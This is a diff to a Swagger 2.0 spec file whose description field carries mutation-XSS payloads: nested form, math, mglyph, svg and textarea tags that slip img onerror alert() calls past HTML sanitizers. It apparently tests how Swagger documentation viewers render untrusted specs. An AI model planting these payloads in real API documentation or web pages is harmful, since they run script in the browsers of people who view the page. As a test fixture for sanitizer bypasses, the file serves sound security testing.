@@ -1,12 +1,17 @@
 swagger: '2.0'
 info:
-  title: You must login before you can continue 😱 !
+  title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
-    <iframe src=q width=500px height=500px><img src=q onerror=alert()></img>Test</iframe>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+    <iframe></iframe>
+    <img src=q></img>
+
   version: production
-basePath: /Submit/
+basePath: /JSSResource/
 produces:
+  - application/xml
+  - application/json
+consumes:
   - application/xml
   - application/json
 paths:
